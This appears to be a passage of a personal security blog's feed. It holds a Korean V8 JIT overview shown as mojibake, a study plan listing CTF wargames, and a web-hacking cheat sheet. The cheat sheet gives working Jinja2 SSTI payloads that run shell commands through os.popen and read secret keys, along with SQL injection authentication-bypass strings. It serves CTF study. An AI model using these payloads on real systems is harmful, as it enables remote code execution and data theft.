<p>Í∞ÄÏû• ÎåÄÌëúÏ†ÅÏù∏ Ïó≠Ìï†ÏùÄ javascript ÏΩîÎìúÎ•º Ïª¥ÌååÏùºÎêú Ïª¥Ìì®ÌÑ∞Ïóê ÏµúÏ†ÅÌôîÎêú ÏΩîÎìúÎ°ú Î≥ÄÌôòÏãúÏºú Ï†ÑÎã¨ÌïòÍ≤å ÎêúÎã§Îäî Í≤ÉÏù¥Îã§. Ïù¥Îïå <code class="language-plaintext highlighter-rouge">JIT(Just-In-Time) Compiler</code>ÎùºÎäî ÎèÖÏ∞ΩÏ†ÅÏù∏ Ïª¥ÌååÏùºÎü¨Î•º ÏÇ¨Ïö©ÌïúÎã§.</p>

<h2 id="v8ÎßåÏùò-ÌäπÏßïÏùÄ-Î¨¥ÏóáÏù¥-ÏûàÏùÑÍπå">V8ÎßåÏùò ÌäπÏßïÏùÄ Î¨¥ÏóáÏù¥ ÏûàÏùÑÍπå?</h2>
<p><img src="/images/2022-V8/intro/inter-comp.png" alt="inter-comp.png" /></p>

<p>Ïö∞ÏÑ† Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞ÏôÄ Ïª¥ÌååÏùºÎü¨Ïóê ÎåÄÌï¥ ÏïåÏïÑÏïº Ìï† Í≤ÉÏù¥Îã§.</p>
<ol>
  <li>Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞
    <ul>
      <li>Ïû•Ï†ê : Ìïú Ï§Ñ Ìïú Ï§Ñ Î≥ÄÌôòÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Ïã§Ìñâ ÏÜçÎèÑÍ∞Ä Îπ†Î•¥Îã§.</li>
      <li>Îã®Ï†ê : ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏΩîÎìúÍ∞Ä Î≥µÏû°Ìï¥ÏßàÏàòÎ°ù Ï†êÏ†ê ÏÜçÎèÑÍ∞Ä ÎäêÎ†§ÏßÑÎã§. ÏòàÎ•º Îì§Ïñ¥, Í∞ôÏùÄ ÏΩîÎìúÎ•º Ïó¨Îü¨Ï∞®Î°Ä Î∞òÎ≥µÌïòÎäî Î∞òÎ≥µÎ¨∏Ïùò Í≤ΩÏö∞, Í∞ôÏùÄ Í≤∞Í≥ºÎ•º Î∞òÎ≥µÌïòÎäî Í≤ÉÏûÑÏóêÎèÑ Î∂àÍµ¨ÌïòÍ≥† ÏΩîÎìúÎ•º Ìïú Ï§Ñ Ìïú Ï§Ñ ÏùΩÎäî Î∞©ÏãùÏóê ÏùòÌï¥ Í∑∏ÎïåÍ∑∏Îïå Ïã§ÌñâÎêúÎã§.</li>
    </ul>
  </li>
  <li>Ïª¥ÌååÏùºÎü¨
    <ul>
      <li>Ïû•Ï†ê : ÌååÏùº Ï†ÑÏ≤¥Î•º ÌïúÎ≤àÏóê ÏùΩÏñ¥ÏÑú Ïª¥ÌååÏùºÎü¨Îäî ÏûëÏóÖÏùÑ Îã®ÏàúÌôîÏãúÌÇ®Îã§. ÏòàÎ•º Îì§Ïñ¥ ÌäπÏ†ï Ìï®ÏàòÎ•º 10ÏñµÎ≤à Î∞òÎ≥µÌï¥Ïïº Ìï† Í≤ΩÏö∞, Ïª¥ÌååÏùº Í≥ºÏ†ïÏóêÏÑú Ìï®ÏàòÎ•º Î∞òÎ≥µÌïòÎäî Í≤ÉÏù¥ ÏïÑÎãàÎùº Ìï®ÏàòÏùò Í≤∞Í≥ºÎ¨ºÏùÑ Î∞òÎ≥µÌïòÎèÑÎ°ù Ïª¥ÌååÏùº ÌïúÎã§. Ïù¥Ï≤òÎüº Î∂àÌïÑÏöîÌïú ÎèôÏûëÏùÑ Ï†úÍ±∞ÌïòÎäî Ïª¥ÌååÏùºÎü¨Ïùò Î∞©ÏãùÏùÑ ÏµúÏ†ÅÌôî, <code class="language-plaintext highlighter-rouge">optimization</code>Ïù¥ÎùºÍ≥† ÌïúÎã§.<br />
(<em>Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞Îäî optimizeÌïòÏßÄ ÏïäÎäîÎã§</em> )</li>
      <li>Îã®Ï†ê : ÏΩîÎìúÎ•º Î∞îÎ°ú Ïã§ÌñâÌïòÏßÄ ÏïäÍ≥†, ÏΩîÎìú Ïã§Ìñâ Ï†Ñ Ï†ÑÏ≤¥Î•º Ïª¥ÌååÏùº ÌïòÎäî Í≥ºÏ†ïÏù¥ ÌïÑÏöîÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Ï¥àÍ∏∞Ïóê ÏÜçÎèÑÍ∞Ä ÎäêÎ¶¥ Ïàò Î∞ñÏóê ÏóÜÎã§.</li>
    </ul>
  </li>
</ol>

<p>ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏóîÏßÑÏùò ÎÇ¥Î∂ÄÎ•º Í≥µÎ∂ÄÌïòÎã§Í∞Ä Ïû†Ïãú Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞ÏôÄ Ïª¥ÌååÏùºÎü¨Ïùò Í∞ÑÎã®Ìïú Í∞úÎÖêÍ≥º Ïû•Îã®Ï†êÏùÑ ÏßöÏñ¥Î¥§Îã§. Í∑∏Îü¨Î©¥ Í≥ºÏó∞ V8 ÏóîÏßÑÏùÄ Ïñ¥Îñ§ Î∞©ÏãùÏùÑ Ï∑®ÌñàÍ∏∏Îûò Îã§Î•∏ ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏóîÏßÑÎ≥¥Îã§ Îçî Îπ†Î•¥Í≥† Ìö®Ïú®Ï†ÅÏúºÎ°ú ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ Î™ÖÎ†πÏùÑ ÏàòÌñâÌï† Ïàò ÏûàÏùÑÍπå? Î∞îÎ°ú Ïó¨Í∏∞ÏóêÏÑú V8 ÏóîÏßÑÏùò ÎèÖÌäπÌïú Ïñ∏Ïñ¥ Î≥ÄÌôò ÎèÑÍµ¨Ïù∏ JIT CompilerÍ∞Ä Îì§Ïñ¥Ïò®Îã§. JITÏùÄ Just In TimeÏùò ÏïΩÏûêÏù¥Îã§.</p>

<h2 id="jit-compilerÏùò-Íµ¨Ï°∞">JIT CompilerÏùò Íµ¨Ï°∞</h2>
<p><img src="/images/2022-V8/intro/jit.png" alt="jit.png" /></p>

<p>V8 ÏóîÏßÑÏùÄ Îã§ÏùåÍ≥º Í∞ôÏùÄ Íµ¨Ï°∞Î°ú ÎêòÏñ¥ ÏûàÎã§.</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Parser</code> : ÏΩîÎìúÎ•º Lexical AnalysisÎùºÎäî Í≥ºÏ†ïÏùÑ ÌÜµÌï¥ <strong>ÌÜ†ÌÅ∞</strong>ÏúºÎ°ú Î∂ÑÌï¥ÌïúÎã§.</li>
  <li><code class="language-plaintext highlighter-rouge">AST(Abstract Syntax Tree)</code> : ParserÏóêÏÑú Î∂ÑÌï¥Îêú ÌÜ†ÌÅ∞ÏùÑ Î∞îÌÉïÏúºÎ°ú Ï∂îÏÉÅÏ†ÅÏù∏ Ìä∏Î¶¨Î•º ÏÉùÏÑ±ÌïúÎã§.</li>
  <li><code class="language-plaintext highlighter-rouge">Ignition</code> : ASTÏóêÏÑú ÎÇòÏò® Ìä∏Î¶¨Î•º V8Ïùò Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞Ïù∏ ignitionÏóêÍ≤å Ï†ÑÎã¨ÌïòÍ≥† Ïù¥Í≤ÉÏùÑ Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌÑ∞Îäî bytecodeÎ°ú Î≥ÄÌôòÏãúÌÇ®Îã§. (High-level Lang to Low-level Lang)</li>
  <li><code class="language-plaintext highlighter-rouge">TurboFan</code>, <code class="language-plaintext highlighter-rouge">Profiler</code> : bytecodeÎ•º Ïã§ÌñâÌïòÏó¨ Human-readable LangÏùÑ Ïã§ÌñâÏãúÌÇ§Í≥†, Í∑∏Ï§ë ÏûêÏ£º ÏÇ¨Ïö©ÎêòÎäî ÏΩîÎìúÎùºÍ≥† ÌåêÎ≥ÑÎêú ÏΩîÎìú Ï°∞Í∞ÅÏùÄ <code class="language-plaintext highlighter-rouge">TurboFan</code>ÏúºÎ°ú Î≥¥ÎÇ¥Ï†∏ ÏµúÏ†ÅÌôîÎ•º ÏàòÌñâÌïòÏó¨ ÏÉàÎ°úÏö¥ Ïª¥ÌååÏùºÎêú ÏΩîÎìúÎ°ú Ïû¨Íµ¨ÏÑ±ÎêúÎã§. (Ïù¥Îïå ÏûêÏ£º ÏÇ¨Ïö©ÎêòÎäî ÏΩîÎìúÎùºÎäî ÎßêÏù¥ Îß§Ïö∞ Ï∂îÏÉÅÏ†ÅÏù¥ÎØÄÎ°ú <code class="language-plaintext highlighter-rouge">Profiler</code> ÎùºÎäî ÏπúÍµ¨ÌïúÌÖå ÏÇ¨Ïö© ÎπàÎèÑ Ïàò Îì±ÏùÑ ÏàòÏßëÌïòÍ≤åÎÅî Ïó≠Ìï†ÏùÑ Î∂ÄÏó¨ÌïòÍ≥†, Î™®Ïù∏ Îç∞Ïù¥ÌÑ∞Î•º ÌÜµÌï¥ TurbofanÏùò ÏïåÍ≥†Î¶¨Ï¶òÎåÄÎ°ú ÏµúÏ†ÅÌôîÎ•º ÌïúÎã§)</li>
</ol>

<h2 id="turbofanÏùÄ-Ïñ¥Îñ§-Ï°∞Í±¥ÏúºÎ°ú-ÏµúÏ†ÅÌôîÌïòÎäî-Í±∏Íπå">TurbofanÏùÄ Ïñ¥Îñ§ Ï°∞Í±¥ÏúºÎ°ú ÏµúÏ†ÅÌôîÌïòÎäî Í±∏Íπå?</h2>
<ol>
  <li>
    <p>ÏΩîÎìúÍ∞Ä Îú®Í≤ÅÍ≥† ÏïàÏ†ïÏ†ÅÏù∏ Í≤É, ÏâΩÍ≤å ÎßêÌïòÎ©¥ ÏûêÏ£º Ìò∏Ï∂úÎêòÍ≥†(Îú®Í≤ÅÍ≥†) ÏΩîÎìúÍ∞Ä Ïïà Î≥ÄÌï®(ÏïàÏ†ïÏ†Å)Ïù¥ÎùºÎäî Í≤ÉÏù¥Îã§. Îß§Î≤à Í∞ôÏùÄ ÌñâÎèôÏùÑ ÏàòÌñâÌïòÎäî Î∞òÎ≥µÎ¨∏ ÎÇ¥Ïóê ÏûàÎäî ÏΩîÎìú Í∞ôÏùÄ Í≤ΩÏö∞Í∞Ä Ïó¨Í∏∞Ïóê Ìï¥ÎãπÌïòÍ∏∞ ÏâΩÎã§.</p>
  </li>
  <li>
    <p>Ïù∏ÌÑ∞ÌîÑÎ¶¨ÌåÖÎêú Î∞îÏù¥Ìä∏ ÏΩîÎìúÏùò Í∏∏Ïù¥Î•º Î≥¥Í≥† ÌäπÏ†ï ÏûÑÍ≥ÑÏ†êÏùÑ ÎÑòÍ∏∞ÏßÄ ÏïäÏúºÎ©¥ ÏûëÏùÄ Ìï®ÏàòÎùºÍ≥† ÌåêÎã®Ìï¥ÏÑú ÏµúÏ†ÅÌôîÎ•º ÏßÑÌñâÌïòÎäî Í≤ÉÏù¥Îã§. ÏûëÍ≥† Îã®ÏàúÌïú Ìï®ÏàòÎäî ÌÅ¨Í≥† Î≥µÏû°Ìïú Ìï®ÏàòÎ≥¥Îã§ ÎèôÏûëÏù¥ Îß§Ïö∞ Ï∂îÏÉÅÏ†ÅÏù¥Í±∞ÎÇò Ï†úÌïúÏ†ÅÏù∏ ÌôïÎ•†Ïù¥ ÎÜíÍ∏∞ ÎïåÎ¨∏Ïóê ÏïàÏ†ïÏ†ÅÏù¥ÎùºÍ≥† Î≥º Ïàò ÏûàÎã§.</p>
  </li>
</ol>

<p>[!] Í∑∏Îü¨ÎÇò, Ïª¥ÌååÏùºÎü¨Îäî 100% ÏôÑÎ≤ΩÌïòÏßÄ Î™ªÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÏùòÎèÑÏôÄ Îã§Î•¥Í≤å Î∞úÏ†ÅÌôî(deoptimization)Í∞Ä ÏùºÏñ¥ÎÇ† ÏàòÎèÑ ÏûàÎã§.</p>

<h2 id="next-topic">Next Topic</h2>
<p>Îã§ÏùåÏóêÎäî V8ÏóêÏÑú ÏûêÎ£åÌòïÏù¥ÎÇò JSÏùò Îã§ÏñëÌïú Î©îÏÜåÎìúÍ∞Ä Ïñ¥Îñ§ ÏãùÏúºÎ°ú Ï†ÄÏû•Ïù¥ ÎêòÍ≥† Î∂àÎü¨Ïò¨ Ïàò ÏûàÎäîÏßÄÎ•º ÏïåÏïÑÎ≥¥Í≥†Ïûê ÌïúÎã§.</p>

<h2 id="reference">reference</h2>
<ul>
  <li><a href="https://dkwjdi.tistory.com/194">https://dkwjdi.tistory.com/194</a></li>
  <li><a href="https://github.com/danbev/learning-v8/blob/master/notes/intro.md">https://github.com/danbev/learning-v8/blob/master/notes/intro.md</a></li>
</ul>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[useful browser engine process for beginner]]></summary></entry><entry><title type="html">Personal R&amp;amp;D plan beginning from ‚Äònow‚Äô</title><link href="http://localhost:4000/life/list-after-graduate/" rel="alternate" type="text/html" title="Personal R&amp;amp;D plan beginning from ‚Äònow‚Äô" /><published>2021-11-08T17:00:00+09:00</published><updated>2021-11-08T17:00:00+09:00</updated><id>http://localhost:4000/life/list-after-graduate</id><content type="html" xml:base="http://localhost:4000/life/list-after-graduate/"><![CDATA[<p><strong>UPDATED : 19 JUL 2024 13:00 UTC+9 KST</strong>
<strong>That would be LAST UPDATE, Let‚Äôs plan more!</strong></p>

<p>This is my plan to be finished until/after graduating.</p>

<h2 id="research">Research</h2>
<blockquote>
  <p>¬ß must be finished until new year‚Äôs day ¬ß</p>
  <ol>
    <li><del>Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete</del></li>
    <li><del>Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete</del></li>
  </ol>
</blockquote>

<h2 id="develop">Develop</h2>
<blockquote>
  <p>¬ß new year STUDY plan ¬ß</p>
  <ol>
    <li><del>Making interpreter/compiler with Rust (With Chris Ohk, ..)</del>
s
      <h2 id="goal">Goal</h2>
      <ul>
        <li>Try something <strong>‚Äúnew‚Äù</strong>, <a href="https://youtu.be/c6rP-YP4c5I"><strong>Try Everything</strong></a></li>
        <li><del>Pass any awesome Univ.‚Äôs admission (Complete)</del></li>
        <li><del>Pass drive license (Complete)</del></li>
        <li>Dreamhack Wargame 1st
          <ul>
            <li><del>Format Sniper (Learn &amp; Analyze about FSB, Solved :D)</del></li>
            <li><del>Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)</del></li>
            <li><del>Unibitmap (Solved :D)</del></li>
            <li><del>dreamboard v2 (V8 : Solved :D)</del></li>
          </ul>
        </li>
        <li><del>Purchase another laptop (<code class="language-plaintext highlighter-rouge">DELL XPS 15 12th generation Intel CPU</code>)</del></li>
        <li>BoB (Best of the Best) 14th? 15th?</li>
        <li>Try to be the BEST without <code class="language-plaintext highlighter-rouge">competitive mind</code>, Just <code class="language-plaintext highlighter-rouge">enjoy</code></li>
      </ul>
    </li>
  </ol>
</blockquote>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="life" /><summary type="html"><![CDATA[2022ÎÖÑ ÏïûÏúºÎ°úÏùò Í≥ÑÌöç Î∞è ÎßàÏùåÍ∞ÄÏßêÏùÑ Ï†ÅÏóàÎçò Í≥≥]]></summary></entry><entry><title type="html">web note (update 2021.10.27)</title><link href="http://localhost:4000/note/web-note-update/" rel="alternate" type="text/html" title="web note (update 2021.10.27)" /><published>2021-10-27T10:00:00+09:00</published><updated>2021-10-27T10:00:00+09:00</updated><id>http://localhost:4000/note/web-note-update</id><content type="html" xml:base="http://localhost:4000/note/web-note-update/"><![CDATA[<p><em>post will be frequently updated</em></p>

<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
<p>Ìï¥Îãπ Ï∑®ÏïΩÏ†êÏùÄ Ïõπ ÌîÑÎ†àÏûÑÏõåÌÅ¨ÏóêÏÑú ÏÇ¨Ïö©ÎêòÎäî Ïó¨Îü¨ Í∞ÄÏßÄ Template EngineÏóêÏÑú Î∞úÏÉùÌïòÎ©∞, ÌäπÎ≥ÑÌïú Íµ¨Î¨∏ÏùÑ ÌÜµÌï¥ <code class="language-plaintext highlighter-rouge">RCE</code>Î•º ÏùºÏúºÌÇ¨ ÏàòÎèÑ ÏûàÎã§.<br />
This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.</p>

<p>‚ñ∂ jinja2</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Í∏∞Î≥∏
</span><span class="p">{{</span> <span class="mi">4</span><span class="o">*</span><span class="mi">4</span> <span class="p">}}</span> <span class="o">=&gt;</span> <span class="mi">16</span>

<span class="c1"># check with config
</span><span class="p">{{</span> <span class="n">config</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">items</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">secret_key</span><span class="sh">'</span><span class="p">]</span> <span class="p">}}</span>

<span class="c1"># RCE with config
</span><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">"</span><span class="s">ls</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="p">(</span><span class="n">config</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">)).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>

<span class="c1"># etc ('',(),get_flashed_messages, url_for, ...)
</span><span class="p">{{</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="o">**</span><span class="n">index</span><span class="o">**</span><span class="p">](</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="n">url_for</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__(</span><span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="s">).popen(</span><span class="sh">"</span><span class="s">ls -al</span><span class="sh">"</span><span class="s">).read()</span><span class="sh">'</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># with request - ÌïÑÌÑ∞ÎßÅÏù¥ Îß§Ïö∞ ÎßéÏùÑ Í≤ΩÏö∞ more query + requestÎ•º ÌôúÏö©ÌïòÏó¨ Ïö∞Ìöå
</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">foo</span><span class="p">.</span><span class="n">bar</span><span class="o">/</span><span class="err">?</span><span class="n">payload</span><span class="o">=</span><span class="p">{{</span> <span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">class</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">mro</span><span class="sh">'</span><span class="p">))</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">getitem</span><span class="sh">'</span><span class="p">))(</span><span class="mi">1</span><span class="p">)</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="n">__mro__</span><span class="o">&amp;</span><span class="n">getitem</span><span class="o">=</span><span class="n">__getitem__</span>
<span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">application</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">popen</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">)()}}</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="sqli-sql-injection">SQLI (sql injection)</h2>
<p>Ìï¥Îãπ Ï∑®ÏïΩÏ†êÏùÄ DBÎ•º Í¥ÄÎ¶¨ÌïòÎäî ÏùëÏö© ÌîÑÎ°úÍ∑∏Îû®ÏóêÏÑú SQL ÏøºÎ¶¨Î•º Ï†ÑÎã¨Ìï† Îïå ÏùòÎèÑÌïòÏßÄ ÏïäÏùÄ Íµ¨Î¨∏ÏùÑ Ï†ÑÎã¨Ìï† Ïàò ÏûàÎèÑÎ°ù Î≥ÄÏ°∞ÏãúÌÇ§Îäî Îç∞ Î™©Ï†ÅÏù¥ ÏûàÎã§.<br />
The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.</p>

<p><strong>1. Comment symbol</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/* ~ */</code>, <code class="language-plaintext highlighter-rouge">-- ~</code>, <code class="language-plaintext highlighter-rouge">#</code> (URL encoded : <code class="language-plaintext highlighter-rouge">%23</code>)</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1-- "</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--'</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1#"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1/*1234*/"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*1234*/</span><span class="s1">' ...?
(must have closed symbol)
</span></code></pre></div></div>

<p><strong>2. with single quarter</strong></p>
<ul>
  <li>idÍ∞Ä <code class="language-plaintext highlighter-rouge">''</code>Î°ú Í∞êÏã∏Ï†∏ ÏûàÏùÑ Í≤ΩÏö∞ <code class="language-plaintext highlighter-rouge">'</code>Î•º inputÏúºÎ°ú ÎÑ£Ïñ¥ Î®ºÏ†Ä Îã´ÏïÑÏ£ºÍ≤åÎÅî Ìïú Îí§ Ï°∞Í±¥Î¨∏ÏùÑ Ïù¥Ïñ¥Ï§ÄÎã§.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>

<span class="c1">-- Select ALL query from tbl</span>
<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1='1"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="s1">'1'</span>
</code></pre></div></div>

<p><strong>3. and, or, &amp;&amp;, ||, in, between, like</strong></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- and, or</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">or</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- &amp;&amp;, || (no space required)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">&amp;&amp;</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">||</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>

<span class="c1">-- in</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span> <span class="k">in</span> <span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span> <span class="k">in</span> <span class="s1">'5678'</span>

<span class="c1">-- between and (both number and char are possible)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">age</span> <span class="k">between</span> <span class="mi">20</span> <span class="k">and</span> <span class="mi">30</span> <span class="c1">-- 20&lt;=age&lt;=30</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">score</span> <span class="k">between</span> <span class="s1">'A'</span> <span class="k">and</span> <span class="s1">'C'</span> <span class="c1">-- 'A'&lt;=score&lt;='C'</span>

<span class="c1">--like (starts with ~, ends with ~, include ~, length)</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'Bae%'</span> <span class="c1">-- starts with Bae</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%uk'</span> <span class="c1">-- ends with uk</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%won%'</span> <span class="c1">-- include won</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'___'</span> <span class="c1">-- length 3 chars</span>
<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="nb">binary</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'~'</span> <span class="c1">-- distinguish upper/lower</span>
</code></pre></div></div>

<p><strong>4. Internal function in mysql</strong></p>
<ul>
